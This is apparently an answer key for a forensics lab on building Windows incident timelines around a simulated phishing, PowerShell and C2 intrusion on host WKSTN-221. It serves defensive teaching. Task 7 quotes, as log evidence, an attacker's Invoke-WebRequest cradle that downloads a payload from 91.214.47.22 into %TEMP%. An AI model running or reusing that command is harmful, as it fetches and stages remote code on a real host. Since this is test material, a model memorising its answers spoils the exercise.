# Lab 10 — Task Answer Key

*Sample answers for the workbook-style Tasks in `Labs/Lab10/ReadMe.md`. These are reference answers, not the only correct ones. The goal is defensible reasoning that names the right evidence and acknowledges uncertainty. For the Hands-On Walkthrough that builds the merged timeline against `Data/WKSTN-221/`, see `walkthrough-answers.md`.*

---

## Task 1 — Explain Why Timelines Matter

**Sample 4–6 sentence explanation:**

> Timeline analysis matters in Windows IR because individual artifacts rarely tell the full story. A logon at 14:31:05 is just a logon. Place it 10 minutes after a Prefetch entry for `update.exe` and beside an inbound SMB/445 flow from the same source IP in the same second, and the same logon becomes part of a coherent attacker narrative. Timelines make explicit what happened before and after and which evidence reinforces which, so responders can test theories against the actual sequence rather than a pre-formed hypothesis. They also produce a chronology that technical leadership, legal, and HR can all use, where a folder of CSVs is not. A timeline is both an analysis tool and a reporting artifact, and it has to be honest about both jobs.

**Q1: Why can a timeline make weak-looking artifacts more meaningful?**

A single Prefetch entry tells you a binary ran. It does not tell you whether the run was suspicious. Place that Prefetch entry next to a 4688 with an Office parent and an outbound network flow within 90 seconds, and it becomes the central execution step. Context converts weak isolated artifacts into strong evidence, and a timeline is the cheapest way to build context.

**Q2: Why is sequence often as important as the artifact itself?**

The same two events mean very different things in different orders. A 4624 success followed by a 4625 failure looks like a logged-on user mistyping a password. The reverse, failures then a success, is the signature of a brute-force or password-spray attack. Sequence turns a list of events into a causal chain, and most attacker narratives hinge on which event came first.

**Q3: Why are timelines especially useful when multiple artifact types are involved?**

Each artifact class answers a different question. MFT covers existence, USN covers change history, Prefetch covers execution, event logs cover authentication, and network flow covers egress. Alone, each is partial. Aligned in time, they corroborate each other. A multi-source timeline turns "the file existed" plus "a binary ran" plus "bytes left the host" into a single defensible chain.

---

## Task 2 — Distinguish Super Timelines from Targeted Timelines

**Sample table:**

| Timeline Type | What It Is | Best Use Case | Main Limitation |
|---|---|---|---|
| Super timeline | Broad aggregation of every timestamped artifact on the host (Plaso-style), often millions of rows | Unknown-scope investigations, when you do not yet know where to look or what is relevant | Volume is overwhelming; without filters it is unreadable; takes hours to generate |
| Targeted timeline | Focused merge of selected artifact sources around a known pivot or time window | When you already have a lead — a suspicious logon, a known-bad binary, a complaint about a specific user | Misses activity outside the window; can confirm rather than discover; depends on choosing the right pivot |

**Q1: Why is a super timeline useful in larger or less-understood incidents?**

When you do not yet know what happened, you cannot define a useful filter. A super timeline lets you find anomalies you would not have thought to look for. It also catches cross-artifact dependencies that single-artifact analysis misses. A file deletion two hours before a service install is invisible if you look only at the service-install moment. The cost is the size of the haystack, but for an unknown-scope incident the haystack is unavoidable.

**Q2: Why is a targeted timeline often the better first move when you already have a suspicious pivot?**

When you already have a known-bad event, the question is "what happened around that event," not "what happened anywhere on the host." A targeted timeline answers the actual question faster, produces fewer rows you have to interpret, and gives stakeholders a sharper narrative. In most workstation cases, a focused ±15-minute window around the pivot resolves the case. The super timeline earns its keep only when the targeted view comes back empty or contradictory.

**Q3: Why can a timeline that is too broad become hard to analyze effectively?**

Volume is its own analytical problem. Nobody can skim a 1.5-million-row Plaso output. Without aggressive filtering, legitimate system activity dilutes the signal until incidents go unnoticed under its weight. Large timelines also invite confirmation bias: you find the one event that matches your hypothesis and stop reading. Tight scope keeps both the analyst and the timeline honest.

---

## Task 3 — Gather the Timeline Inputs

**Sample input table:**

| Input Source | File Name / Location | What It Contributes | Notes |
|---|---|---|---|
| MFT CSV | `Data/WKSTN-221/mft.csv` | File creation / modification anchors via `Created0x10`, `LastModified0x10` | 77 rows; supports the file-creation half of the narrative |
| Event log export | `Data/WKSTN-221/security-evtx.csv` | Authentication, process creation (4688), explicit-credential (4648) | 38 rows; the spine of the timeline |
| Prefetch output | `Data/WKSTN-221/prefetch.csv` | First-run and last-run anchors for executed binaries | 20 rows; `update.exe` last-run is the natural pivot |
| SRUM output | `Data/WKSTN-221/srum.csv` | Per-process network bytes-out, valuable for confirming exfil volume | Coarse-grained (~hourly buckets) |
| USN Journal (added) | `Data/WKSTN-221/usn-journal.csv` | File change-reason trail: create, rename, data-extend, delete | 51 rows; complements MFT for short-lived artifacts |
| Network flow (added) | `Data/WKSTN-221/network-flow.csv` | Outbound connections with bytes counts and owning process | 20 rows; correlates with SRUM and the 91.214.47.22 C2 |

**Q1: Why is it useful to know what each source contributes before merging?**

Different artifact classes answer different questions. MFT confirms existence at a moment in time, and USN narrates change reasons. Prefetch attests to execution, and event logs anchor authentication and process trees. SRUM gives volume estimates, and network flow shows egress. Knowing what each source contributes keeps you from over- or under-weighting any one of them in the merged view. It also tells you which questions the merged timeline can and cannot answer.

**Q2: Why should you not assume all artifact sources have equally trustworthy timestamps?**

MFT timestamps can be timestomped. USN journal timestamps reflect the file system transaction time, but only on the local clock. Event logs are reliable but bounded by audit policy. SRUM is bucketed and lossy. Network flow timestamps may come from a separate sensor with its own clock skew. Treating every source as equally trustworthy collapses the differences between them. Documenting the relative trust level keeps the merged timeline honest.

**Q3: Why is documenting input provenance important before building the timeline?**

Every later finding traces back to a row in the timeline, and every row traces back to a source. If the source is undocumented, you cannot defend the finding on review. Provenance also catches a common mistake: pulling CSVs from two different hosts or parser versions into the same merge without realizing it. The result is a timeline that silently mixes incompatible data.

---

## Task 4 — Normalize Time

**Sample normalization table:**

| Artifact Source | Original Time Basis | Normalized Time Basis | Adjustment Needed? | Notes |
|---|---|---|---|---|
| MFT CSV | UTC (MFTECmd default) | UTC | No | MFTECmd emits UTC; confirmed against `Created0x10` of a known recent file |
| Event logs | UTC (EvtxECmd default) | UTC | No | EvtxECmd parses Windows event timestamps as UTC; verified |
| Prefetch | UTC (PECmd default) | UTC | No | PECmd emits UTC; `LastRun` values match other UTC sources to the second |
| SRUM | UTC (srum-dump default) | UTC | No | Verified |
| USN Journal (added) | UTC | UTC | No | Same parser family as MFT; consistent |
| Network flow (added) | UTC | UTC | No | Sensor exports in UTC; documented in `Data/WKSTN-221/README.md` |

**Q1: Why is time normalization mandatory before meaningful timeline analysis?**

A merged timeline works only if every row uses the same time basis. Mixing local time, UTC, and parser-default timestamps silently scrambles event order, and the resulting timeline produces confident-looking but wrong narratives. UTC is the standard because every Windows artifact source can be reduced to it, and because it sidesteps daylight-saving-time discontinuities entirely.

**Q2: Why can time skew between hosts or sources create false narratives?**

If two hosts are off by even a few minutes, the order of cross-host events is wrong. "Host A caused Host B to do X" then becomes either unsupported or actively misleading. Skew between artifact sources on the same host has the same effect at finer granularity. A 30-second skew between event logs and the network sensor can put the "outbound flow" before the "process started," which is impossible and obviously wrong on review. Document skew before you start ordering events.

**Q3: Why should time uncertainty be documented rather than ignored?**

Ignored uncertainty does not disappear. It gets buried in your conclusions. Write it down, for example "this source has ~1-minute resolution" or "this host's clock drifted up to 30 seconds during the case window." That lets the next analyst weigh the timeline correctly, and it lets your report acknowledge the limits of your evidence. Pretending the timestamps are perfect produces strong-looking findings that fall apart under scrutiny.

---

## Task 5 — Merge the Sources into a Single Timeline CSV

**Sample column-purpose table:**

| Field / Column | Why It Is Included |
|---|---|
| Time (UTC) | The primary sort key — every analytical operation on a timeline depends on chronological order in a single time basis |
| Source Artifact | Preserves provenance so any row can be traced back to its origin parser and CSV — required for defensibility and for understanding the trust level of each entry |
| Event Description | A short, descriptive summary that lets the analyst skim the timeline without re-reading the raw payload for every row |
| Significance | The analyst's interpretation tag — `c2-comm`, `lateral-move`, `noise`, etc. Separates the data from the analysis so reviewers can challenge the interpretation without re-deriving the data |
| Confidence | HIGH (≥2 independent sources agree) / MEDIUM (single reliable source) / LOW (indirect or single low-confidence source) — keeps the merge honest about how strongly each row is supported |
| Notes | Long-form context: paths, processes, users, hosts, follow-up. Keeps the structured columns clean while still preserving the information needed for triage |

**Q1: Why is a common schema useful when merging different artifact sources?**

A common schema makes the merge possible. Without it, MFT rows have one column set, event-log rows have another, and network rows have a third, so no analytical operation can run across them. The schema also enforces discipline. Reducing every source to the same columns forces the analyst to decide what each source contributes and what is noise.

**Q2: Why should event descriptions be concise instead of overly interpretive?**

The description column is what you see when skimming the timeline. If it is loaded with interpretation, a wrong interpretation is harder to spot. Keep the data and the interpretation in separate columns: the description says what happened, and the `Significance` says what it means. This separation also lets reviewers challenge the interpretation without challenging the data.

**Q3: Why is it helpful to preserve the originating artifact type in the merged timeline?**

Provenance makes a row defensible. "An entry exists at 14:21:03 UTC" is much less useful than "Prefetch reports `update.exe` last run at 14:21:03 UTC." The Source Artifact column also lets you weigh conflicting evidence. When MFT and USN disagree on a file's creation time, you need to know which row came from which parser to reason about why.

---

## Task 6 — Identify a Pivot Event

**Sample pivot record:**

| Pivot Field | Value |
|---|---|
| Pivot Event Time (UTC) | 2024-11-14 14:21:03 |
| Artifact Source | Prefetch |
| Event Description | `update.exe` first-run / last-run timestamp |
| Why It Was Chosen | The binary name appears nowhere in the host's legitimate software inventory, and the path (`%TEMP%\update.exe`) is a stager-style location. The entry sits between the encoded-PowerShell 4688 at 14:19:38 and the explicit-credential 4648 at 14:33:18, the obvious midpoint of the suspicious chain. |

**Q1: Why is choosing the right pivot event important?**

The pivot defines the time window you investigate. The window defines the events you see, and the events define the conclusions you reach. A bad pivot that sits too early, too late, or on a benign event narrows the case to evidence that does not resolve it. A good pivot sits at the analytical center of the activity, so the ±15-minute window around it captures both the lead-up and the follow-on.

**Q2: Why should the pivot be specific and defensible rather than vague?**

A vague pivot, such as "sometime around 2 p.m.", produces a vague timeline. A specific pivot names a timestamp, a source, and a reason. It lets you justify the scope choice on review and lets the next analyst reproduce your work. Defensibility matters because reviewers will almost always question the pivot choice: why this event, and why not the one 15 minutes earlier?

**Q3: Why can a strong pivot make the surrounding timeline much easier to interpret?**

A strong pivot is a known-bad anchor that lets you classify everything around it as before-the-bad or after-the-bad. Activity in the 10 minutes before the pivot probably contributes to the attacker chain. Activity in the 10 minutes after probably reflects the consequences. That framing turns the timeline from a list of events into a story with a beginning, middle, and end.

---

## Task 7 — Examine ±10–15 Minutes Around the Pivot

**Sample window (12 entries, from the WKSTN-221 dataset around the 14:21:03 pivot):**

| Time (UTC) | Source Artifact | Event Description | Significance | Confidence | Notes |
|---|---|---|---|---|---|
| 14:18:55 | LNK | Recent LNK created for `Q4_Payroll_Review.xlsm` in the `payroll-admin` profile | Lure document open | HIGH | Claims only what the LNK records. "The user opened it" is MEDIUM: the Jump List comes from the same shell action and does not show a person at the keyboard (Ch10 §10.7.3) |
| 14:19:38 | Security 4688 | `OUTLOOK.EXE → powershell.exe -EncodedCommand` | Suspicious child of Office | HIGH | The PowerShell 4104 in the same second corroborates it: a different writer on a different trigger |
| 14:19:38 | PowerShell 4104 | Script block: `Invoke-WebRequest 'https://91.214.47.22/h/u.t' -OutFile $env:TEMP\a.tmp` | C2 download cradle | HIGH | Same user and same second as the 4688 above |
| 14:19:42 | Network flow | TCP/443 outbound to 91.214.47.22, 1,847 bytes out and 184,221 bytes in | C2 candidate | HIGH | Owning process is `powershell.exe`. The perimeter flow log records the same connection, and the 4104 named this address 4 s earlier |
| 14:20:11 | MFT + USN | `%TEMP%\update.exe` created | Attacker tooling drop | HIGH | MFT and USN agree, but they count as one source because NTFS writes both (Ch10 §10.7.2). The independent corroborator is the PowerShell 4104 `Move-Item` of `b.tmp` to `update.exe` at 14:20:11.2 |
| 14:21:03 | Prefetch | `update.exe` first run | Pivot — attacker execution | HIGH | Prefetch run count 1 and the Security 4688 at 14:21:03.4: two writers, two trigger paths (Ch10 §10.7.3) |
| 14:21:55 | Network flow | TCP/443 to 91.214.47.22 from `update.exe`, 184,221 bytes out and 2,415,891 bytes (2.3 MB) in, ending 14:22:44 | C2 / exfil | HIGH | Byte counts match the SRUM `update.exe` bucket |
| 14:23:44 | USN | `%TEMP%\update.exe` deleted | Anti-forensic | MEDIUM | Single source but the reason code is unambiguous |
| 14:31:05 | Security 4624 | Network logon (type 3, NtLmSsp) as `payroll-admin` from `10.0.4.17` | Lateral-prep | MEDIUM | Only logon in the window. An inbound SMB/445 flow from `10.0.4.17` starts the same second |
| 14:33:18 | Security 4648 | Explicit credential `payroll-admin → FILESVR-03` | Lateral-move signal | HIGH | The host and perimeter flow logs both record SMB/445 to `10.0.4.18` in the same second |
| 14:33:18 | Network flow | SMB/445 outbound from `10.0.4.32` to FILESVR-03 (`10.0.4.18`) | Lateral-move data path | MEDIUM | Need FILESVR-03 logs to confirm session accepted |
| 14:38:00 | Security 4634 | Logoff of a type 3 `payroll-admin` session from `10.0.4.17` | Session bookend | MEDIUM | Just outside the ±15-minute window. Matches the 14:31:05 logon on user, logon type, and source IP, but no logon ID links the two |

**Q1: Which entries appear most central to the suspicious activity?**

The central entries are the Outlook → PowerShell 4688 at 14:19:38, the matching PowerShell 4104 script-block content in the same second, the `update.exe` creation at 14:20:11 and execution at 14:21:03, and the 4648 explicit-credential event at 14:33:18. These five rows are the spine of the case. In order, they show initial access through encoded PowerShell from a lure document, the payload drop, execution, and the start of lateral movement.

**Q2: Which entries are supportive but not central?**

The LNK open of the lure document at 14:18:55 supports the initial-access vector but does not on its own prove malice. The outbound 91.214.47.22 flows confirm the C2 channel, but attributing them requires correlation with the owning process. The SMB flow to FILESVR-03 corroborates the 4648, but confirming that the session was established requires FILESVR-03's own logs. These rows raise confidence in the central findings but are not findings on their own.

**Q3: Which entries may be noise or unrelated background activity?**

The Outlook keepalive flows to Exchange Online at 14:18:55 and 14:30:00 are routine mail traffic, almost certainly unrelated to the attacker activity. The 4688 entries in the window are not routine. `ipconfig`, `nltest`, `net`, and `arp` all ran as `payroll-admin` with `update.exe` as the parent, so they belong to the attacker chain. The 4634 logoff at 14:38:00 falls just outside the window and is ambiguous. It matches the 14:31:05 inbound session on user, logon type, and source IP, but no logon ID confirms the link. *Tag* routine rows as noise in the timeline rather than dropping them, so the next reviewer can confirm or challenge the tag.

---

## Task 8 — Identify Cross-Artifact Alignment

**Sample alignment table:**

| Timeline Finding | Artifact Source 1 | Artifact Source 2 | Why the Alignment Matters |
|---|---|---|---|
| Encoded PowerShell execution at 14:19:38 | Security 4688 (process creation) | PowerShell 4104 (script block content) | One source confirms the process started; the other confirms what the process actually did — together they are a full execution record, not just an event |
| `update.exe` dropped to `%TEMP%` at 14:20:11 | MFT (`Created0x10` row) | USN Journal (`RenameNewName` reason) | MFT record 22417 holds the file under its current name only. The USN Journal shows the same record created as `b.tmp` at 14:20:11.0 and renamed to `update.exe` at 14:20:11.5. A rename keeps the MFT record, so the MFT gives the current name and the USN Journal gives the history. NTFS wrote both, so they count as one source, not two (Chapter 10 §10.7.2) |
| C2 beacon to 91.214.47.22 at 14:19:42 | PowerShell 4104 (URL in script block) | Network flow (TCP/443 to same IP) | The script block names the URL; the network sensor confirms the connection went out. The script could have been written without ever running; the flow proves it ran |
| `update.exe` first run at 14:21:03 | Prefetch (`LastRun`) | SRUM (`update.exe` bytes in the 14:30:00 bucket) | Prefetch confirms execution; SRUM corroborates the volume of data the process moved — together they evidence both execution and exfil volume |

**Q1: Why does cross-artifact alignment increase confidence?**

Single sources can be tampered with, misparsed, or incomplete. When two independent artifact classes report the same event at the same time, the chance that both are wrong in the same direction is low. Those classes might be NTFS, the event log, or the network sensor. Alignment is the cheapest form of evidence corroboration available to a host responder. It is how single-source MEDIUM findings become multi-source HIGH findings.

**Q2: Why are isolated events often weaker than multi-source clusters?**

An isolated event is consistent with many narratives. A 4624 success could be the legitimate user, a service account, an attacker after credential theft, or an automated test, and the event alone does not distinguish them. Now place the same 4624 inside a cluster. A brute-force 4625 series precedes it, a Prefetch entry for a suspicious binary follows it, and an outbound flow accompanies it. That 4624 is much harder to explain benignly. Clusters survive scrutiny, and isolated events often do not.

**Q3: Why should you still be careful not to overstate alignment as proof of causation?**

Time alignment proves correlation, not causation. Two events at the same second may share a cause, may be coincidence, or one may have triggered the other. The timeline cannot distinguish those possibilities by itself. Say "these events align in time and are consistent with the following narrative," not "these events prove the following sequence." Stronger claims need a stronger underlying argument than time alignment alone.

---

## Task 9 — Separate Strong Support from Overclaims

**Sample classification table:**

| Statement | Classification | Why |
|---|---|---|
| A suspicious event occurred at the pivot time | Strongly supported | The Prefetch entry for `update.exe` is a direct execution record |
| Multiple artifact sources align around the same suspicious window | Strongly supported | MFT, USN, Prefetch, event logs, network, and SRUM all cluster between 14:18 and 14:34 |
| The attacker definitely used PsExec at that exact moment | Not supported by this timeline alone | No PsExec artifact in this dataset; the lateral signal is 4648, not PsExec — calling it "PsExec" overclaims a specific tool |
| Activity clustered around the pivot deserves deeper review | Strongly supported | The clustering itself is the finding — multiple artifact classes at the same window is the definition of a suspicious cluster |
| The timeline supports a coherent sequence of suspicious behavior | Strongly supported | Lure open → encoded PS → C2 → tool drop → execution → exfil → lateral attempt is a complete and internally consistent chain |
| The timeline alone proves attacker intent | Not supported by this timeline alone | Intent requires additional evidence — communications, prior pattern of life, attribution — that timelines do not contain |
| A focused window can reveal more than reviewing artifacts separately | Strongly supported | The cross-artifact alignment shown in Task 8 is invisible when artifacts are reviewed source-by-source |
| Every event in the window is incident-related | Not supported by this timeline alone | Some entries are background activity that happens to fall in the window, such as the Outlook keepalive flows to Exchange Online at 14:18:55 and 14:30:00 |

**Six analyst-written additional statements (sample):**

| Statement | Classification | Why |
|---|---|---|
| The `update.exe` binary was deleted by the attacker | Suggested but needs corroboration | USN shows deletion; deletion alone does not attribute it — could be a cleanup script, could be the user, could be the malware itself |
| Approximately 2.3 MB of data reached the host through the C2 channel, and about 184 KB left it | Strongly supported | SRUM and network flow agree on the `update.exe` byte counts: 2,415,891 received and 184,221 sent |
| The attacker accessed FILESVR-03 at 14:33:18 | Suggested but needs corroboration | The 4648 evidences attempted credential supply; need FILESVR-03's logs to confirm the connection was accepted |
| Initial access came through Outlook | Strongly supported | The 4688 parent is `OUTLOOK.EXE`, and the LNK / Jump List show the lure document was opened first |
| The `payroll-admin` account is compromised | Suggested but needs corroboration | The account did the suspicious things, but the events are equally consistent with credential theft and impersonation |
| The attacker has been resident on this host since at least 14:18 UTC | Strongly supported | The LNK open at 14:18:55 is the earliest anomalous artifact in the window |

---

## Task 10 — Write the Narrative Paragraph

**Sample paragraph (matches the WKSTN-221 walkthrough output):**

> Between 14:18 and 14:34 UTC on 2024-11-14, host `WKSTN-221` recorded a coherent sequence of suspicious activity originating from user `payroll-admin`. At 14:18:55, the user opened `Q4_Payroll_Review.xlsm`. Forty-three seconds later, `outlook.exe` spawned `powershell.exe` with an encoded command line. The corresponding PowerShell script-block log captured the decoded payload: an `Invoke-WebRequest` to `https://91.214.47.22/h/u.t` followed by an XOR decode and rename to `update.exe`. The first outbound TCP/443 flow to 91.214.47.22 began at 14:19:42 from `powershell.exe`. The dropped binary `update.exe` was created in the user's `%TEMP%` directory at 14:20:11 and executed at 14:21:03 (first-run / last-run per Prefetch). Between 14:21:55 and 14:22:44, `update.exe` received approximately 2.3 MB from 91.214.47.22 and sent about 184 KB. The binary was deleted at 14:23:44. At 14:33:18, the same account supplied explicit credentials to `FILESVR-03` via `cmd.exe` (Security event 4648), followed by an outbound SMB flow to that server. The timeline supports this narrative: initial access via Office macro → encoded-PowerShell stager → C2 download → on-disk execution → C2 / exfil → attempted lateral movement to a file server. Confirming whether the lateral-move attempt succeeded requires FILESVR-03's own logs. The timeline shows the attempt, not the outcome.

**Q1: Why is a narrative paragraph useful after building the timeline table?**

The table is the evidence, and the paragraph is the explanation. Stakeholders such as technical leadership, legal, HR, and executives read paragraphs much faster than tables. Compressing the timeline into prose also forces the analyst to commit to which findings are central and which are supporting. The paragraph catches inconsistencies, too: if the narrative does not flow, the timeline probably has gaps that the table view obscured.

**Q2: Why should the narrative stay faithful to the timeline instead of embellishing it?**

Every sentence in the narrative should be traceable to a row in the timeline. Embellishment means adding plausible-sounding details that the data does not support. It produces a paragraph that reads well but cannot survive cross-examination. The narrative is most valuable when it is exactly as strong as the underlying evidence, and exactly as cautious where the evidence is thin.

**Q3: Why does plain language matter if the audience may later include non-specialists?**

Forensic findings have to land with the people who decide what to do with them: legal, HR, executive leadership, and sometimes regulators or external counsel. Those audiences cannot parse EvtxECmd field names or NTFS journal reason codes. A paragraph written in plain language carries the analytical content into a register the decision-maker can act on. It is also the part of the report that survives translation into other formats, such as briefing slides, legal exhibits, and press statements.

---

## Task 11 — Save and Package the Mini Timeline

**Sample naming-convention table:**

| Item | Naming Convention | Example |
|---|---|---|
| Merged timeline | `<host>-merged-timeline-<YYYY-MM-DD>.csv` | `WKSTN-221-merged-timeline-2024-11-14.csv` |
| Pivot window export | `<host>-pivot-<YYYY-MM-DD>-<HHMM>UTC.csv` | `WKSTN-221-pivot-2024-11-14-1421UTC.csv` |
| Narrative paragraph file | `<host>-narrative-<YYYY-MM-DD>.md` | `WKSTN-221-narrative-2024-11-14.md` |
| Timeline notes | `<host>-timeline-notes-<YYYY-MM-DD>.md` | `WKSTN-221-timeline-notes-2024-11-14.md` |

**Q1: Why should the focused pivot-window extract be saved separately from the full merged timeline?**

The pivot window is the analytical product, and the merged timeline is the raw input. Keeping them separate lets you show stakeholders the curated narrative without making them skim the full merged view. It also lets you re-derive a different pivot window later without re-running the merge. The separation matches how the case will be cited downstream: reports reference the pivot window, and audits reference the full merge.

**Q2: Why is packaging important if the timeline will be reused later?**

A timeline you cannot find again in three months is functionally lost. With a predictable folder structure, predictable filenames, and an obvious place for the narrative paragraph, the timeline survives analyst rotation, case handoff, and the eventual review for the next similar case. Good packaging costs 15 minutes at the end of a case, and in return the case is reusable.

**Q3: Why should the narrative paragraph live alongside the timeline data and not only in chat notes or memory?**

The narrative paragraph is the analytical interpretation of the data, and it loses meaning when separated from the data it describes. Stored alongside the CSVs, it tells anyone who opens the timeline folder what the timeline is supposed to say. Stored only in chat notes, the interpretation disappears with the chat channel, and the next reviewer has to derive it again. Co-locating data and interpretation is a basic hygiene rule for any reusable artifact.

---

## Task 12 — Write an Analyst Handoff Note

**Sample handoff note:**

```
Case Reference:    IR-2024-0142
Author:            J. Responder
Date/Time (UTC):   2024-11-14 19:00

Timeline Inputs Used:
- MFT CSV (Data/WKSTN-221/mft.csv) — 77 rows
- USN Journal CSV (Data/WKSTN-221/usn-journal.csv) — 51 rows
- Security event log CSV — 38 rows
- PowerShell Operational event log CSV — for 4104 content
- Prefetch CSV — 20 rows
- SRUM CSV — coarse-bucket bytes-out
- Network flow CSV — 20 rows

Chosen Pivot Event:
- Prefetch entry for update.exe at 2024-11-14 14:21:03 UTC
- Rationale: binary name is not in software inventory; %TEMP% path is stager-style; pivot
  sits between the encoded-PS 4688 (14:19:38) and the 4648 lateral signal (14:33:18)

Most Important Timeline Findings:
- Initial access: OUTLOOK.EXE -> powershell.exe -EncodedCommand at 14:19:38
- C2 channel: TCP/443 to 91.214.47.22 starting 14:19:42. Largest flow
  14:21:55-14:22:44 (update.exe), ~2.3 MB inbound / ~184 KB outbound
- Tool drop: %TEMP%\update.exe created 14:20:11, run 14:21:03, deleted 14:23:44
- Lateral attempt: 4648 explicit credential to FILESVR-03 at 14:33:18

What Is Strongly Supported:
- The sequence lure-open -> encoded-PS -> C2 -> drop -> exec -> exfil is end-to-end visible
- The 4648 attempt is unambiguously evidenced in the Security log
- Volume of outbound data corroborated by SRUM and network flow independently

What Is Suggested but Not Confirmed:
- Whether the FILESVR-03 lateral-move attempt succeeded (need FILESVR-03 logs)
- Whether the payroll-admin account is compromised vs. acting on its own behalf
- Whether other internal hosts received the same encoded-PS pattern

Recommended Next Correlations:
1. Pull FILESVR-03's Security log for the 14:33:18 window to confirm session outcome
2. Hunt the encoded-PowerShell pattern across the rest of the workstation fleet
3. Cross-reference 91.214.47.22 against proxy and firewall logs for other host hits

Notes for Incoming Analyst:
The pivot window is well-bounded — ±15 minutes around 14:21:03 captures the entire
chain on this host. The lateral-move thread is the open one; everything else on
WKSTN-221 is closed to single-host findings. The 91.214.47.22 IOC is the highest-value
pivot for finding sibling-host activity.
```

---

## Task 13 — Reflection

**Q1: Why timelines matter**

Timelines convert artifact lists into narratives, and narratives are what stakeholders can act on. A single Prefetch entry, a single 4688, or a single MFT row does not tell a story by itself. Aligned in time, they become the chronological skeleton of an incident: what happened first, what happened next, what reinforced what. Timelines also survive translation across audiences. The same chronology that justifies an analytical finding can anchor an executive briefing or a legal exhibit, which is rarely true of any single artifact class.

**Q2: Focus versus overload**

A super timeline contains everything, including everything that does not matter. When you already have a lead, the ±15-minute window around it usually contains the entire answerable part of the case. The rest of the super timeline is noise that dilutes your confidence rather than improving it. Targeted timelines also produce a deliverable a stakeholder can read: 12 rows tell a story, and 15 million do not. The super timeline earns its keep when the targeted view comes back empty or contradictory, not as a default first move.

**Q3: Correlation and caution**

Temporal alignment does more than any other technique to strengthen evidence on a host, but it is also one of the easiest things to overclaim. Two events at the same second are correlated, but they may or may not be causally linked. Write "consistent with the following sequence," which the alignment supports, rather than "proves the following sequence," which it does not. Strong alignment with cautious language produces findings that survive review. Strong alignment with strong language produces findings that get reversed when someone notices the alternative explanation.

**Q4: Narrative value**

Technical analysis ends in a paragraph someone outside the analyst's chair can use. The timeline table is the evidence record, and the narrative is the version that lands with legal, HR, executive leadership, or external counsel. Writing the narrative also checks the analysis itself. If the events do not flow into a coherent paragraph, the timeline is probably missing something or claiming something the data does not support. Plain-language prose is the final test that the analytical work is complete.

---

## Ready-to-move-on self-check

**1. Why is UTC the default time basis for merged timelines instead of local time?**

UTC has no daylight-saving discontinuities, no timezone ambiguity, and every Windows artifact source can be reduced to it. Local time produces silent ordering errors across artifact classes; UTC does not.

**2. What is the difference between an isolated artifact and a multi-source cluster, and why does the difference matter?**

An isolated artifact is consistent with many narratives. A multi-source cluster, such as MFT + USN + Prefetch + 4688 + network flow at the same second, is consistent with very few. Clusters survive scrutiny because the chance that every source is wrong in the same direction is low.

**3. If a single 4648 explicit-credential event is in the timeline, what does it confirm and what does it not?**

It confirms that an account supplied credentials to a remote target. It does not confirm that the target accepted the connection, that anyone accessed files, or that the account is compromised. Those need additional evidence from the target host.

---

## Walkthrough ↔ workbook bridges

These bridges connect the workbook tasks (this file) to specific values produced by the Hands-On Walkthrough's merge against `Data/WKSTN-221/`.

- **Task 5 (merge schema) ↔ Walkthrough Step 2.** The merge produces 206 rows total (77 MFT + 51 USN + 38 Security + 20 Prefetch + 20 network). Every later task scopes against that number. A 30-minute pivot window cuts those 206 rows to 78. Analyst curation produces the 40-row reference file, a scale you can reason about. Of those 40 rows, 39 fall inside the window, and the 40th is the 14:38:00 logoff just after it. Keep the numbers distinct: 78 is what the window returns, and 39 is what survives judgement inside it.

- **Task 6 (pivot selection) ↔ Walkthrough Step 3.** The pivot picked in the sample answer (Prefetch entry for `update.exe` at 14:21:03 UTC) is the same one the walkthrough centers on. The ±15-minute window around that pivot bounds the analytical exercise. Choosing the LNK open at 14:18:55 instead would include the same activity but shift the framing toward "lure document → consequences" rather than "execution → flank events."

- **Task 7 (curated window) ↔ Walkthrough Step 4.** The annotated window in the walkthrough centers on the canonical pivot row at 14:21:03 (`update.exe` Prefetch last-run). Flanking it are the OUTLOOK→POWERSHELL 4688 at 14:19:38, the outbound C2 flow to 91.214.47.22, the `%TEMP%\update.exe` MFT/USN creation and deletion pair, and the explicit-credential 4648 at 14:33:18. The reference output ships at `Data/WKSTN-221/example-curated-timeline.csv` for direct comparison.

- **Task 8 (cross-artifact alignment) ↔ Walkthrough Step 5.** The "encoded PowerShell + C2 connection + tool drop + execution" alignment is the cluster that makes the case. Security 4688, PowerShell 4104, network flow to 91.214.47.22, MFT/USN creation of `update.exe`, and Prefetch first-run all fall within roughly 90 seconds. Five independent sources reinforce the same narrative, and that convergence turns five MEDIUM findings into one HIGH cluster.

- **Task 9 (overclaim discipline) ↔ Walkthrough Step 3.** Step 3 produces the 4648 row at 14:33:18 UTC — `payroll-admin → FILESVR-03` from `cmd.exe`. That row evidences attempted credential supply. It does not evidence that FILESVR-03 accepted the session or that anyone accessed files on FILESVR-03. Task 9 asks you to refuse to upgrade "attempt" to "success" without FILESVR-03's own log evidence. That calibration survives a defensive review.
